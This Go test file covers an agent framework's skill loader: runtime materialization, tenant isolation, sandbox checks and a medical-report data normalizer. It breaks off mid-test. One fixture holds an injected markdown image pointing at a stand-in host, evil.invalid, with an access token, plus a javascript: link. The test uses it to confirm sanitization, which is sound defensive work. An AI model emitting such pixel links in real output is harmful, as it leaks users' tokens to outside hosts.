package app

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"testing/fstest"
	"time"

	skilldomain "mac/internal/skills"
)

func TestLoadBuiltinSkillsFromFSRuntimeClassification(t *testing.T) {
	loader := NewSkillsLoader(".", "", "")
	fsys := fstest.MapFS{
		"builtin/OPENKITTY_INDEX.json": &fstest.MapFile{Data: []byte(`{"docs":{"desc":"docs","skills":["doc-only","scripted"]}}`)},
		"builtin/doc-only/SKILL.md": &fstest.MapFile{Data: []byte(`---
name: doc-only
description: Pure documentation skill
---
# Doc Only

Instructions only.
`)},
		"builtin/scripted/SKILL.md": &fstest.MapFile{Data: []byte(`---
name: scripted
description: Scripted skill
---
# Scripted
`)},
		"builtin/scripted/scripts/run.py": &fstest.MapFile{Data: []byte(`print("ok")`)},
	}

	if err := loader.LoadBuiltinSkillsFromFS(fsys, "builtin"); err != nil {
		t.Fatalf("LoadBuiltinSkillsFromFS failed: %v", err)
	}

	doc, err := loader.GetSkill("doc-only")
	if err != nil {
		t.Fatalf("doc-only skill missing: %v", err)
	}
	if doc.RequiresRuntime {
		t.Fatal("pure documentation builtin skill should not require runtime materialization")
	}

	scripted, err := loader.GetSkill("scripted")
	if err != nil {
		t.Fatalf("scripted skill missing: %v", err)
	}
	if !scripted.RequiresRuntime {
		t.Fatal("skill with scripts directory should require runtime materialization")
	}
	index, err := loader.LoadSkillIndex()
	if err != nil || index == nil || len(index.Categories) != 1 {
		t.Fatalf("flat OPENKITTY_INDEX should be parsed, got %#v (err=%v)", index, err)
	}
}

func TestEnsureSkillRuntimeRefreshesStaleRuntimeCopy(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)

	loader := NewSkillsLoader(".", "", "")
	fsys := fstest.MapFS{
		"builtin/OPENKITTY_INDEX.json": &fstest.MapFile{Data: []byte(`{"docs":{"desc":"docs","skills":["scripted"]}}`)},
		"builtin/scripted/SKILL.md": &fstest.MapFile{Data: []byte(`---
name: scripted
description: Scripted skill
---
# Scripted
`)},
		"builtin/scripted/scripts/run.py": &fstest.MapFile{Data: []byte(`print("fresh")`)},
	}
	if err := loader.LoadBuiltinSkillsFromFS(fsys, "builtin"); err != nil {
		t.Fatalf("LoadBuiltinSkillsFromFS failed: %v", err)
	}
	skill, err := loader.GetSkill("scripted")
	if err != nil {
		t.Fatalf("scripted skill missing: %v", err)
	}
	if _, err := loader.EnsureSkillRuntime(skill); err != nil {
		t.Fatalf("initial runtime materialization failed: %v", err)
	}

	runtimeFile := filepath.Join(skill.RuntimeDir, "scripts", "run.py")
	if err := os.WriteFile(runtimeFile, []byte(`print("stale")`), 0644); err != nil {
		t.Fatalf("write stale runtime file: %v", err)
	}
	if _, err := loader.EnsureSkillRuntime(skill); err != nil {
		t.Fatalf("runtime refresh failed: %v", err)
	}
	data, err := os.ReadFile(runtimeFile)
	if err != nil {
		t.Fatalf("read refreshed runtime file: %v", err)
	}
	if got := string(data); got != `print("fresh")` {
		t.Fatalf("runtime file was not refreshed: %q", got)
	}
}

func TestEnsureSkillRuntimeSkipsUnchangedRuntimeRewrite(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)

	loader := NewSkillsLoader(".", "", "")
	fsys := fstest.MapFS{
		"builtin/OPENKITTY_INDEX.json": &fstest.MapFile{Data: []byte(`{"docs":{"desc":"docs","skills":["scripted"]}}`)},
		"builtin/scripted/SKILL.md": &fstest.MapFile{Data: []byte(`---
name: scripted
description: Scripted skill
---
# Scripted
`)},
		"builtin/scripted/scripts/run.py":     &fstest.MapFile{Data: []byte(`print("fresh")`)},
		"builtin/scripted/assets/helper.py":   &fstest.MapFile{Data: []byte(`print("fresh helper")`)},
		"builtin/scripted/templates/icon.svg": &fstest.MapFile{Data: []byte(`<svg/>`)},
	}
	if err := loader.LoadBuiltinSkillsFromFS(fsys, "builtin"); err != nil {
		t.Fatal(err)
	}
	skill, err := loader.GetSkill("scripted")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := loader.EnsureSkillRuntime(skill); err != nil {
		t.Fatal(err)
	}
	template := filepath.Join(skill.RuntimeDir, "templates", "icon.svg")
	past := time.Now().Add(-2 * time.Hour).Truncate(time.Second)
	if err := os.Chtimes(template, past, past); err != nil {
		t.Fatal(err)
	}
	if _, err := loader.EnsureSkillRuntime(skill); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(template)
	if err != nil {
		t.Fatal(err)
	}
	if !info.ModTime().Equal(past) {
		t.Fatalf("unchanged runtime template was rewritten: modtime=%v want=%v", info.ModTime(), past)
	}

	assetCode := filepath.Join(skill.RuntimeDir, "assets", "helper.py")
	if err := os.WriteFile(assetCode, []byte(`print("stale helper")`), 0644); err != nil {
		t.Fatal(err)
	}
	if _, err := loader.EnsureSkillRuntime(skill); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(assetCode)
	if err != nil {
		t.Fatal(err)
	}
	if got := string(data); got != `print("fresh helper")` {
		t.Fatalf("stale runtime asset code was not refreshed: %q", got)
	}
}

func TestExecuteBuiltinSkillMaterializesRuntimeInsideTenantWorkspace(t *testing.T) {
	workspace := t.TempDir()
	globalHome := t.TempDir()
	t.Setenv("HOME", globalHome)
	t.Setenv("USERPROFILE", globalHome)

	loader := NewSkillsLoader(workspace, "tenant-agent", "")
	fsys := fstest.MapFS{
		"builtin/OPENKITTY_INDEX.json": &fstest.MapFile{Data: []byte(`{"docs":{"desc":"docs","skills":["scripted"]}}`)},
		"builtin/scripted/SKILL.md": &fstest.MapFile{Data: []byte(`---
name: scripted
description: Scripted tenant skill
---
# Scripted

Run scripts/run.py.
`)},
		"builtin/scripted/scripts/run.py": &fstest.MapFile{Data: []byte(`print("tenant")`)},
	}
	if err := loader.LoadBuiltinSkillsFromFS(fsys, "builtin"); err != nil {
		t.Fatal(err)
	}

	ctx := withResolvedWorkspace(context.Background(), workspace)
	ctx = withExecutionIdentity(ctx, ExecutionIdentity{
		TenantID:     "tenant-a",
		SubjectID:    "user-a",
		TenantScoped: true,
	})
	out, err := loader.ExecuteSkill(ctx, "scripted", nil)
	if err != nil {
		t.Fatalf("ExecuteSkill failed: %v", err)
	}

	runtimeDir := filepath.Join(workspace, ".openkitty", "runtime", "builtin", "scripted")
	if _, err := os.Stat(filepath.Join(runtimeDir, "scripts", "run.py")); err != nil {
		t.Fatalf("tenant runtime was not materialized inside the workspace: %v", err)
	}
	if _, err := os.Stat(filepath.Join(globalHome, ".openkitty", "runtime", "builtin", "scripted", "scripts", "run.py")); !os.IsNotExist(err) {
		t.Fatalf("tenant runtime leaked into the process-user cache: %v", err)
	}
	if !strings.Contains(out, "运行时目录: ."+string(filepath.Separator)+filepath.Join(".openkitty", "runtime", "builtin", "scripted")) {
		t.Fatalf("tenant use_skill output did not expose a workspace-relative runtime: %s", out)
	}
	if strings.Contains(out, workspace) || strings.Contains(out, globalHome) {
		t.Fatalf("tenant use_skill output disclosed a physical runtime path: %s", out)
	}
}

func TestTenantPPTArtDirectorRuntimePassesSandboxAndProductionGate(t *testing.T) {
	workspace := t.TempDir()
	loader := NewSkillsLoader(workspace, "tenant-agent", "")
	if err := loader.LoadBuiltinSkillsFromFS(builtinSkillsFS, "builtin"); err != nil {
		t.Fatal(err)
	}

	ctx := withResolvedWorkspace(context.Background(), workspace)
	ctx = withExecutionIdentity(ctx, ExecutionIdentity{
		TenantID:     "tenant-a",
		SubjectID:    "user-a",
		TenantScoped: true,
	})
	ctx = withPresentationProductionState(ctx, "生成一份投资分析 PPT")
	useSkill := ToolCall{
		ID:   "use-ppt-art-director",
		Name: "use_skill",
		Arguments: map[string]interface{}{
			"skill_name": "ppt-art-director",
		},
	}
	out, err := loader.ExecuteSkill(ctx, "ppt-art-director", nil)
	if err != nil {
		t.Fatalf("ExecuteSkill failed: %v", err)
	}
	recordPresentationToolResult(ctx, useSkill, ToolResult{
		ToolCallID: useSkill.ID,
		Name:       useSkill.Name,
		Content:    out,
	}, nil)

	runtimeDir := filepath.Join(".", ".openkitty", "runtime", "builtin", "presentation", "ppt-art-director")
	scaffoldPath := filepath.Join(runtimeDir, "scripts", "scaffold_task_pptx.py")
	if _, err := os.Stat(filepath.Join(workspace, scaffoldPath)); err != nil {
		t.Fatalf("official PPT scaffold missing from tenant runtime: %v", err)
	}
	scaffold := ToolCall{
		ID:   "scaffold",
		Name: "cli",
		Arguments: map[string]interface{}{
			"command": "python " + scaffoldPath +
				" --builder .openkitty/storage/build_deck.py" +
				" --output .openkitty/storage/report.pptx",
		},
	}

	sandbox := NewWorkspaceSandbox(workspace, SandboxConfig{Mode: SandboxStrict})
	if err := validateSandboxToolCall(sandbox, &AgentContext{
		Context:  ctx,
		ToolCall: scaffold,
		Metadata: map[string]interface{}{},
	}); err != nil {
		t.Fatalf("tenant sandbox rejected the official workspace runtime: %v", err)
	}
	if result, err, blocked := checkPresentationToolGate(ctx, scaffold); blocked || err != nil {
		t.Fatalf("production gate rejected the official workspace scaffold: blocked=%v err=%v result=%q", blocked, err, result.Content)
	}
}

func TestBuiltinSkillOutputWarnsAboutRuntimePathRules(t *testing.T) {
	skill := &skilldomain.Skill{
		Metadata: skilldomain.SkillMetadata{
			Name:        "scripted",
			Description: "Scripted skill",
		},
		Source:     "builtin",
		Embedded:   true,
		RuntimeDir: filepath.Join(t.TempDir(), "runtime", "builtin", "scripted"),
		Code:       "Use scripts/run.py",
	}

	out, err := (&skilldomain.BuiltinSkillExecutor{}).Execute(nil, skill, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"来源: builtin（内存）",
		"已返回主指令",
		"仍须按本轮任务按需读取或执行",
		"不要再读取运行时目录中的 SKILL.md",
		"运行时目录:",
		"不要探测 workspace `skills/` 或 `.openkitty/skills/`",
		"ptc_execute",
		"cwd 默认是 workspace",
	} {
		if !strings.Contains(out, want) {
			t.Fatalf("builtin skill output missing %q: %s", want, out)
		}
	}
}

func TestDocumentationSkillOutputDistinguishesUserDiskSource(t *testing.T) {
	dir := t.TempDir()
	skill := &skilldomain.Skill{
		Metadata:   skilldomain.SkillMetadata{Name: "quarterly-risk-memo", Description: "Custom memo format"},
		Source:     "user",
		Path:       filepath.Join(dir, "SKILL.md"),
		RuntimeDir: dir,
		Code:       "Write RISK-MEMO-V1.",
	}
	out, err := (&skilldomain.BuiltinSkillExecutor{}).Execute(context.Background(), skill, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"来源: user（用户目录/磁盘）", "Skill 文件:", "用户 Skill 目录:", "RISK-MEMO-V1"} {
		if !strings.Contains(out, want) {
			t.Fatalf("user skill output missing %q: %s", want, out)
		}
	}
	for _, forbidden := range []string{"来源: builtin", "生成的运行时支持副本", "不要再读取运行时目录中的 SKILL.md"} {
		if strings.Contains(out, forbidden) {
			t.Fatalf("user skill was mislabeled with builtin runtime guidance %q: %s", forbidden, out)
		}
	}
}

func TestSkillSearchReportsMemoryAndDiskOrigins(t *testing.T) {
	loader := NewSkillsLoader(t.TempDir(), "test", "")
	loader.RegisterSkill("builtin-ppt", &skilldomain.Skill{
		Metadata: skilldomain.SkillMetadata{Name: "builtin-ppt", Description: "PPT verification"},
		Source:   "builtin", Embedded: true, Path: "builtin://builtin-ppt",
	})
	loader.RegisterSkill("user-ppt", &skilldomain.Skill{
		Metadata: skilldomain.SkillMetadata{Name: "user-ppt", Description: "PPT memo"},
		Source:   "user", Path: filepath.Join(t.TempDir(), "user-ppt", "SKILL.md"),
	})
	out := loader.SearchSkills([]string{"ppt"}, 10, false)
	for _, want := range []string{"来源: `builtin`（内存）", "来源: `user`（用户目录/磁盘）"} {
		if !strings.Contains(out, want) {
			t.Fatalf("skill search missing origin %q: %s", want, out)
		}
	}
}

func TestInvokedSkillPromptRecordsLoadedContent(t *testing.T) {
	loader := NewSkillsLoader(".", "", "")
	fsys := fstest.MapFS{
		"builtin/OPENKITTY_INDEX.json": &fstest.MapFile{Data: []byte(`{"docs":{"desc":"docs","skills":["doc-only"]}}`)},
		"builtin/doc-only/SKILL.md": &fstest.MapFile{Data: []byte(`---
name: doc-only
description: Pure documentation skill
---
# Doc Only

Follow these instructions.
`)},
	}
	if err := loader.LoadBuiltinSkillsFromFS(fsys, "builtin"); err != nil {
		t.Fatalf("LoadBuiltinSkillsFromFS failed: %v", err)
	}

	loader.RecordInvokedSkill("doc-only", "loaded instructions")
	prompt := loader.BuildInvokedSkillsPrompt(5, 1000)
	if !strings.Contains(prompt, "doc-only") || !strings.Contains(prompt, "loaded instructions") {
		t.Fatalf("invoked skill prompt missing recorded content: %s", prompt)
	}
}

func TestSkillMetadataAliasesResolve(t *testing.T) {
	loader := NewSkillsLoader(".", "", "")
	fsys := fstest.MapFS{
		"builtin/OPENKITTY_INDEX.json": &fstest.MapFile{Data: []byte(`{"docs":{"desc":"docs","skills":["canonical-skill"]}}`)},
		"builtin/canonical-skill/SKILL.md": &fstest.MapFile{Data: []byte(`---
name: Canonical Skill
description: Canonical operations
aliases:
  - legacy-skill
  - old-tool-name
---
# Canonical Skill

Canonical instructions.
`)},
	}
	if err := loader.LoadBuiltinSkillsFromFS(fsys, "builtin"); err != nil {
		t.Fatalf("LoadBuiltinSkillsFromFS failed: %v", err)
	}

	out, err := loader.ExecuteSkill(context.Background(), "legacy-skill", nil)
	if err != nil {
		t.Fatalf("metadata alias should execute canonical skill: %v", err)
	}
	if !strings.Contains(out, "Canonical instructions") {
		t.Fatalf("alias output should include canonical skill content: %s", out)
	}

	skill, err := loader.GetSkill("old-tool-name")
	if err != nil {
		t.Fatalf("metadata alias should resolve canonical skill: %v", err)
	}
	if skill.Path != "builtin://canonical-skill" {
		t.Fatalf("alias resolved unexpected path: %s", skill.Path)
	}

	loader.RecordInvokedSkill("legacy-skill", "loaded via alias")
	prompt := loader.BuildInvokedSkillsPrompt(5, 1000)
	if !strings.Contains(prompt, "canonical-skill") || !strings.Contains(prompt, "loaded via alias") {
		t.Fatalf("alias invocation should record canonical skill content: %s", prompt)
	}
}

func TestBuiltinMedGuidResolves(t *testing.T) {
	loader := NewSkillsLoader(t.TempDir(), "Assistant", "")
	if err := loader.LoadBuiltinSkillsFromFS(builtinSkillsFS, "builtin"); err != nil {
		t.Fatalf("load embedded builtin skills: %v", err)
	}
	skill, err := loader.GetSkill("med-guid")
	if err != nil {
		t.Fatalf("resolve @med-guid: %v", err)
	}
	if skill.Metadata.Name != "med-guid" {
		t.Fatalf("resolved skill name = %q, want med-guid", skill.Metadata.Name)
	}
	if !skill.RequiresRuntime {
		t.Fatal("med-guid normalizer must be materialized with the builtin runtime")
	}
	runtimeDir, err := loader.EnsureSkillRuntime(skill)
	if err != nil {
		t.Fatalf("materialize med-guid runtime: %v", err)
	}
	for _, relative := range []string{"scripts/normalize_joys360.py", "references/joys360.md", "references/report-guide.md", "references/tcm-integration.md"} {
		info, statErr := os.Stat(filepath.Join(runtimeDir, filepath.FromSlash(relative)))
		if statErr != nil || !info.Mode().IsRegular() || info.Size() == 0 {
			t.Fatalf("med-guid runtime resource %s missing/empty: info=%v err=%v", relative, info, statErr)
		}
	}
	for _, required := range []string{
		"是什么",
		"为什么",
		"怎么办",
		"精简版",
		"标准版",
		"完整版",
		"bundled normalizer",
		"endpoint-fact floor",
		"Do not stop merely because one tool path is unavailable",
		"fact_sha256",
		"--url-stdin",
		"Never place a token-bearing health URL",
		"must not change the bottom line",
		"bundle.report",
		"bundle.reports",
		"red flags override",
		"中西医双视角",
		"四诊合参",
		"中医辨证信息不足",
		"资料型待辨方向",
		"always include visible",
		"not a translation or proof",
		"natural consultation",
		"internal reasoning sequence, not mandatory headings",
		"never require those words as visible headings",
		"should not contain Markdown headings, horizontal rules, tables",
		"220–340 Chinese characters",
		"one most relevant TCM `待辨方向`",
		"consecutive bullet piles",
		"Do not reassure that the situation is `大概率不是病`",
	} {
		if !strings.Contains(skill.Content, required) {
			t.Fatalf("med-guid runtime contract missing %q", required)
		}
	}
}

func TestMedGuidNormalizerHandlesNameOnlyJoys360Response(t *testing.T) {
	python, err := exec.LookPath("python3")
	if err != nil {
		python, err = exec.LookPath("python")
	}
	if err != nil {
		t.Skip("python is unavailable")
	}
	names := []string{
		"生理指标", "体型指数", "高血压风险", "预测体重", "疾病风险", "综合健康评分", "预测性别",
		"脂肪肝风险", "体重指数BMI", "腰围", "心脏病风险", "心血管疾病风险", "心率(bpm)", "未获取",
		"体温", "中风风险", "心血管代谢年龄", "信噪比", "不规则心跳", "高胆固醇血症风险", "心率变异性",
		"心脏负荷", "腰围身高比", "血管功能", "收缩压", "心理指标", "多年心血管疾病风险",
		"糖化血红蛋白水平高于5.7%的风险", "整体代谢健康风险", "空腹血糖水平高于5.5mmol/L的风险",
		"高甘油三酯血症风险", "睡眠质量指数", "身体指标", "焦虑指数", "活力指数", "未获取",
		"精神压力指数", "舒张压", "皮肤年龄", "生命体征", "2 型糖尿病风险", "呼吸(brpm)",
	}
	items := make([]map[string]string, 0, len(names))
	for i, name := range names {
		items = append(items, map[string]string{"name": name, "score": fmt.Sprintf("%d.5", i)})
	}
	payload, err := json.Marshal(map[string]interface{}{
		"header": map[string]interface{}{"code": 0},
		"body":   map[string]interface{}{"list": items},
	})
	if err != nil {
		t.Fatal(err)
	}
	input := filepath.Join(t.TempDir(), "joys360-name-only.json")
	if err := os.WriteFile(input, payload, 0600); err != nil {
		t.Fatal(err)
	}
	command := exec.Command(python, "builtin/research/med-guid/scripts/normalize_joys360.py", "--file", input, "--format", "json")
	command.Env = append(os.Environ(), "PYTHONUTF8=1")
	output, err := command.CombinedOutput()
	if err != nil {
		t.Fatalf("normalizer failed: %v\n%s", err, output)
	}
	var result struct {
		OK     bool `json:"ok"`
		Result struct {
			SchemaVersion string `json:"schema_version"`
			FactSHA256    string `json:"fact_sha256"`
			Quality       struct {
				Level string `json:"level"`
			} `json:"quality"`
			Coverage struct {
				InputItems    int `json:"input_items"`
				ParsedMetrics int `json:"parsed_metrics"`
				ValidValues   int `json:"valid_values"`
				InvalidValues int `json:"invalid_values"`
			} `json:"coverage"`
			Metrics []struct {
				ID          string `json:"id"`
				ValueStatus string `json:"value_status"`
				Unit        string `json:"unit"`
			} `json:"metrics"`
			Ignored int `json:"ignored_items"`
		} `json:"result"`
	}
	if err := json.Unmarshal(output, &result); err != nil {
		t.Fatalf("decode normalizer output: %v\n%s", err, output)
	}
	if !result.OK || len(result.Result.Metrics) != 42 || result.Result.Ignored != 0 {
		t.Fatalf("unexpected normalization summary: ok=%v metrics=%d ignored=%d", result.OK, len(result.Result.Metrics), result.Result.Ignored)
	}
	if result.Result.SchemaVersion != "med-guid.joys360.v2" || len(result.Result.FactSHA256) != 64 {
		t.Fatalf("normalizer did not emit a versioned fact snapshot: version=%q hash=%q", result.Result.SchemaVersion, result.Result.FactSHA256)
	}
	if result.Result.Coverage.InputItems != 42 || result.Result.Coverage.ParsedMetrics != 42 ||
		result.Result.Coverage.ValidValues+result.Result.Coverage.InvalidValues != 42 {
		t.Fatalf("unexpected coverage: %#v", result.Result.Coverage)
	}
	for index, want := range map[int]string{13: "CVD_MULTI_YEAR_RISK_YEARS", 35: "HEIGHT", 37: "BP_DIASTOLIC", 41: "BR_BPM"} {
		if got := result.Result.Metrics[index].ID; got != want {
			t.Fatalf("metric[%d].id = %q, want %q", index, got, want)
		}
	}
	if result.Result.Metrics[21].Unit != "" {
		t.Fatalf("BP_RPP must not invent a dB unit, got %q", result.Result.Metrics[21].Unit)
	}
	command = exec.Command(python, "builtin/research/med-guid/scripts/normalize_joys360.py", "--file", input, "--format", "bundle", "--mode", "standard")
	command.Env = append(os.Environ(), "PYTHONUTF8=1", "PYTHONDONTWRITEBYTECODE=1")
	bundleOutput, err := command.CombinedOutput()
	if err != nil {
		t.Fatalf("bundle report failed: %v\n%s", err, bundleOutput)
	}
	var bundle struct {
		OK         bool              `json:"ok"`
		Mode       string            `json:"mode"`
		FactSHA256 string            `json:"fact_sha256"`
		Report     string            `json:"report"`
		Reports    map[string]string `json:"reports"`
		Result     struct {
			FactSHA256 string `json:"fact_sha256"`
		} `json:"result"`
	}
	if err := json.Unmarshal(bundleOutput, &bundle); err != nil {
		t.Fatalf("decode bundle output: %v\n%s", err, bundleOutput)
	}
	if !bundle.OK || bundle.Mode != "standard" || bundle.FactSHA256 != result.Result.FactSHA256 ||
		bundle.Result.FactSHA256 != result.Result.FactSHA256 || !strings.Contains(bundle.Report, "标准版") ||
		bundle.Report != bundle.Reports["standard"] || len(bundle.Reports) != 3 {
		t.Fatalf("bundle did not preserve report and fact snapshot: %#v", bundle)
	}

	reports := make(map[string]string, 3)
	for mode, marker := range map[string]string{"concise": "精简版", "standard": "标准版", "full": "完整版"} {
		if !strings.Contains(bundle.Reports[mode], marker) {
			t.Fatalf("bundle follow-up rendering %q is missing marker %q", mode, marker)
		}
		command := exec.Command(python, "builtin/research/med-guid/scripts/normalize_joys360.py", "--file", input, "--format", "report", "--mode", mode)
		command.Env = append(os.Environ(), "PYTHONUTF8=1")
		output, err := command.CombinedOutput()
		if err != nil {
			t.Fatalf("%s report failed: %v\n%s", mode, err, output)
		}
		report := string(output)
		directNormalized := strings.ReplaceAll(strings.TrimSpace(report), "\r\n", "\n")
		bundleNormalized := strings.ReplaceAll(strings.TrimSpace(bundle.Reports[mode]), "\r\n", "\n")
		if directNormalized != bundleNormalized {
			t.Fatalf("bundle %s rendering drifted from direct rendering", mode)
		}
		for _, section := range []string{"是什么", "为什么", "怎么办"} {
			if !strings.Contains(report, section) {
				t.Fatalf("%s report missing %q", mode, section)
			}
		}
		for _, tcmInvariant := range []string{"中医初步辨证", "C 级", "待辨", "不是已确立证型"} {
			if !strings.Contains(report, tcmInvariant) {
				t.Fatalf("%s report omitted the device-only TCM screening invariant %q: %s", mode, tcmInvariant, report)
			}
		}
		if !strings.Contains(report, "脾胃运化") || !strings.Contains(report, "肝的疏泄") {
			t.Fatalf("%s report did not route metabolic and mind/sleep domains to TCM differential questions: %s", mode, report)
		}
		if mode != "concise" {
			for _, expandedTCM := range []string{"总体诊断思路", "细分候选", "辨证路径", "穴位保健"} {
				if !strings.Contains(report, expandedTCM) {
					t.Fatalf("%s report omitted expanded TCM reasoning or care %q: %s", mode, expandedTCM, report)
				}
			}
		}
		for _, unsafe := range []string{"中医诊断为", "确诊证型", "每日一剂", "克，水煎服"} {
			if strings.Contains(report, unsafe) {
				t.Fatalf("%s report emitted an unsafe TCM conclusion or prescription %q: %s", mode, unsafe, report)
			}
		}
		if !strings.Contains(report, marker) {
			t.Fatalf("%s report missing mode marker %q", mode, marker)
		}
		if strings.Contains(report, "较高的模型输出") || strings.Contains(report, "按数值") {
			t.Fatalf("%s report ranked unrelated model outputs: %s", mode, report)
		}
		reports[mode] = report
	}
	if !(len(reports["concise"]) < len(reports["standard"]) && len(reports["standard"]) < len(reports["full"])) {
		t.Fatalf("report depth did not increase by mode: concise=%d standard=%d full=%d", len(reports["concise"]), len(reports["standard"]), len(reports["full"]))
	}
	if strings.Contains(reports["concise"], "附录：全部指标") || strings.Contains(reports["standard"], "附录：全部指标") || !strings.Contains(reports["full"], "附录：全部指标") {
		t.Fatal("full metric appendix must be exclusive to full mode")
	}
	for _, required := range []string{"紧急程度", "资料与可信度", "重点发现", "建议首诊科室", "问医生的问题", "适用范围与依据", result.Result.FactSHA256} {
		if !strings.Contains(reports["full"], required) {
			t.Fatalf("full report missing formal-report field %q", required)
		}
	}
	if strings.Contains(reports["full"], "context&#95;only") || !strings.Contains(reports["full"], "仅作背景信息") {
		t.Fatalf("full report did not localize context-only metric quality: %s", reports["full"])
	}
	for _, required := range []string{"严重过敏反应", "伤害自己的想法"} {
		if !strings.Contains(reports["full"], required) {
			t.Fatalf("full report red-flag guidance missing %q", required)
		}
	}
}

func TestMedGuidNormalizerQuarantinesInvalidAndConflictingData(t *testing.T) {
	python, err := exec.LookPath("python3")
	if err != nil {
		python, err = exec.LookPath("python")
	}
	if err != nil {
		t.Skip("python is unavailable")
	}

	payloadSecret := "PAYLOADTOKENFWD93"
	rawUnknownID := "ACCESS_TOKEN_" + payloadSecret
	payload, err := json.Marshal(map[string]interface{}{
		"header": map[string]interface{}{"code": 0},
		"body": map[string]interface{}{"list": []map[string]interface{}{
			{"abbrName": "HPT_RISK_PROB", "name": "高血压风险", "score": "10"},
			{"abbrName": "HPT_RISK_PROB", "name": "高血压风险重复", "score": "80"},
			{"abbrName": "BP_SYSTOLIC", "name": "收缩压", "score": "999"},
			{"abbrName": "HR_BPM", "name": "心率", "score": "80"},
			{"abbrName": rawUnknownID, "name": "![pixel](https://evil.invalid/collect?access_token=" + payloadSecret + ") [click](javascript:alert(1))", "score": "4"},
			{"name": "无法识别", "score": "5"},
		}},
	})
	if err != nil {
		t.Fatal(err)
	}
	input := filepath.Join(t.TempDir(), "joys360-edge.json")
	if err := os.WriteFile(input, payload, 0600); err != nil {
		t.Fatal(err)
	}
	run := func(format, mode string) []byte {
		t.Helper()
		args := []string{"builtin/research/med-guid/scripts/normalize_joys360.py", "--file", input, "--format", format}
		if mode != "" {
			args = append(args, "--mode", mode)
		}
		command := exec.Command(python, args...)
		command.Env = append(os.Environ(), "PYTHONUTF8=1", "PYTHONDONTWRITEBYTECODE=1")
		output, runErr := command.CombinedOutput()
		if runErr != nil {
			t.Fatalf("normalizer failed: %v\n%s", runErr, output)
		}
		return output
	}

	var first struct {
		OK     bool `json:"ok"`
		Result struct {
			FactSHA256 string `json:"fact_sha256"`
			Quality    struct {
				Level string `json:"level"`
			} `json:"quality"`
			Coverage struct {
				ValidValues   int `json:"valid_values"`
				InvalidValues int `json:"invalid_values"`
				Unknown       int `json:"unknown_metrics"`
			} `json:"coverage"`
			Metrics []struct {
				ID          string      `json:"id"`
				Value       interface{} `json:"value"`
				ValueStatus string      `json:"value_status"`
			} `json:"metrics"`
			Ignored    int `json:"ignored_items"`
			Duplicates int `json:"duplicate_items"`
		} `json:"result"`
	}
	firstOutput := run("json", "")
	if strings.Contains(string(firstOutput), payloadSecret) || strings.Contains(string(firstOutput), "access_token") || strings.Contains(string(firstOutput), "evil.invalid") || strings.Contains(string(firstOutput), rawUnknownID) {
		t.Fatalf("normalized snapshot retained an untrusted source identifier: %s", firstOutput)
	}
	if err := json.Unmarshal(firstOutput, &first); err != nil {
		t.Fatal(err)
	}
	if !first.OK || first.Result.Quality.Level != "limited" || first.Result.Ignored != 1 || first.Result.Duplicates != 1 {
		t.Fatalf("edge payload was not classified safely: %#v", first.Result)
	}
	if first.Result.Coverage.ValidValues != 2 || first.Result.Coverage.InvalidValues != 2 || first.Result.Coverage.Unknown != 1 {
		t.Fatalf("unexpected edge coverage: %#v", first.Result.Coverage)
	}
	statuses := make(map[string]string)
	for _, metric := range first.Result.Metrics {
		statuses[metric.ID] = metric.ValueStatus
		if metric.ValueStatus != "valid" && metric.Value != nil {
			t.Fatalf("quarantined metric %s retained a renderable value: %#v", metric.ID, metric.Value)
		}
	}
	for id, want := range map[string]string{
		"HPT_RISK_PROB": "conflicting_duplicate",
		"BP_SYSTOLIC":   "outside_supported_range",
		"HR_BPM":        "valid",
	} {
		if statuses[id] != want {
			t.Fatalf("metric %s status=%q want=%q", id, statuses[id], want)
		}
	}
	unknownStatus := ""
	for id, status := range statuses {
		if strings.HasPrefix(id, "UNKNOWN_") {
			unknownStatus = status
		}
	}
	if unknownStatus != "valid" {
		t.Fatalf("opaque unknown metric status=%q want valid; all statuses=%v", unknownStatus, statuses)
	}

	var second struct {
		Result struct {
			FactSHA256 string `json:"fact_sha256"`
		} `json:"result"`
	}
	if err := json.Unmarshal(run("json", ""), &second); err != nil {
		t.Fatal(err)
	}
	if first.Result.FactSHA256 == "" || second.Result.FactSHA256 != first.Result.FactSHA256 {
		t.Fatalf("fact snapshot hash was not deterministic: first=%q second=%q", first.Result.FactSHA256, second.Result.FactSHA256)
	}

	full := string(run("report", "full"))
	if strings.Contains(full, "收缩压估算 999") || strings.Contains(full, "高血压风险估算 10 %") || strings.Contains(full, "高血压风险估算 80 %") {
		t.Fatalf("full report emitted quarantined raw values: %s", full)
	}
	for _, forbidden := range []string{payloadSecret, "access_token", "evil.invalid", "javascript:", "![pixel]", "来源名称"} {
		if strings.Contains(full, forbidden) {
			t.Fatalf("full report retained untrusted source-label content %q: %s", forbidden, full)
		}
	}
}

func TestMedGuidNormalizerHandlesEmptyDataAndDoesNotEchoSensitiveURL(t *testing.T) {
	python, err := exec.LookPath("python3")
	if err != nil {
		python, err = exec.LookPath("python")
	}
	if err != nil {
		t.Skip("python is unavailable")
	}

	emptyPayload := []byte(`{"header":{"code":0},"body":{"list":[]}}`)
	input := filepath.Join(t.TempDir(), "joys360-empty.json")
	if err := os.WriteFile(input, emptyPayload, 0600); err != nil {
		t.Fatal(err)
	}
	command := exec.Command(python, "builtin/research/med-guid/scripts/normalize_joys360.py", "--file", input, "--format", "report", "--mode", "standard")
	command.Env = append(os.Environ(), "PYTHONUTF8=1", "PYTHONDONTWRITEBYTECODE=1")
	report, err := command.CombinedOutput()
	if err != nil {
		t.Fatalf("empty report failed: %v\n%s", err, report)
	}
	if !strings.Contains(string(report), "没有取得可用于结论的有效指标") || strings.Contains(string(report), "HbA1c") {
		t.Fatalf("empty payload produced non-conditional medical actions: %s", report)
	}
	if !strings.Contains(string(report), "中医初步辨证") || !strings.Contains(string(report), "信息不足") {
		t.Fatalf("empty payload omitted the explicit TCM limitation section: %s", report)
	}

	secret := "TOPSECRET-MED-GUID-TOKEN"
	sensitiveURL := "https://untrusted.invalid/report?access_token=" + secret
